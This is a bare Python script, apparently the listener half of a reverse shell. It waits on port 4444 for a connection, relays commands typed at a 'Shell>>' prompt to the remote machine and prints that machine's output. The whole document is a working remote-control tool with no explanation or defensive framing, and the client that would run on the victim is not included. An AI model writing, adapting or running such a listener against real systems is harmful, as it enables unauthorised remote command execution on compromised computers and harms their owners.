#Server 
import socket
import sys

IP = '0.0.0.0'
PORT = 4444

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind((IP, PORT))
s.listen(1)
print('Server is listening on port '+str(PORT)+' ...')
conn, addr = s.accept()
print('[+] Connected to ', addr)
while True:
     sys.stdout.write('Shell>>')
     command=sys.stdin.readline()
     if command=='exit\n':
          print('[+] Close')
          conn.send(b'exit')
          conn.close()
          break
     elif command != '\n':
          conn.send(command.encode())
          output=conn.recv(1024)
          print(output)
